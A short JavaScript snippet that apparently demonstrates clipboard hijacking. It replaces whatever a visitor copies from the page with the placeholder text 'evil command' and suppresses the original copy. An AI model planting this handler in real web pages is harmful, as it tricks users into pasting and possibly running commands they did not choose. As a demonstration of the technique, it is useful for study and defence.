document.addEventListener('copy', function(e) {
	e.clipboardData.setData('text/plain', "evil command");
	e.preventDefault();
});